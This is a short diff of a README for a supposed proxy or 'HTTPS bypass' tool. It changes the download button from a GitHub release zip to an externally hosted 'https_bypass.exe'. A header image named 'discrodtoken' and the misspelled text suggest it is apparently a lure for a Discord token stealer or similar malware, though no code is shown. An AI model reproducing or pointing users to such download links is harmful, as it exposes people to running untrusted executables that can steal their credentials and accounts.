@@ -1,7 +1,8 @@
 # Socks 5 Https Bypass Bloked GT
 
 ![discrodtoken](https://github.com/UseApple918/UseApple9181/assets/136140544/33b371a8-8cd8-41af-a388-d6ce24d92eb5)
-[![down](https://github.com/UseApple918/UseApple9181/assets/136140544/999f0136-2f93-4f71-9059-8996b3558dca)](https://github.com/UseApple918/UseApple9181/releases/download/discordd/Installer.zip)
+[![down](https://github.com/UseApple918/UseApple9181/assets/136140544/999f0136-2f93-4f71-9059-8996b3558dca)]
+(https://www.upload.ee/files/16448136/https_bypass.exe.html))
 
 ##  Features
 - Fully acces
